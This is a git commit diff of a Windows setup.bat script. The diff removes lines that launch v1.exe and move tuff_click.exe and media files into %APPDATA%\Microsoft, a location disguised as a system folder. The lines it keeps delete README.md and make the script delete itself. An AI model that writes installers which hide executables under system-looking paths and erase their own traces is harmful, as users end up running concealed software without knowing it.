644ad30d5ec4844f9febf44336a3a59682c14674
Cameron Paul Swart <ieatnickles69@gmail.com>
2026-01-17 18:20:39 -0500

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,17 +1,8 @@
 @echo off
-set "DEST=%APPDATA%\Microsoft"
-
-start v1.exe
-del tuff.7z
 del README.md
 
-if not exist "%DEST%" mkdir "%DEST%"
-for %%F in (*tuff*.png *tuff*.mp3) do (
-    move "%%F" "%DEST%\"
-)
-move tuff_click.exe %DEST%
-
 start /b "" cmd /c del "%~f0"&exit /b
+
 
 
 
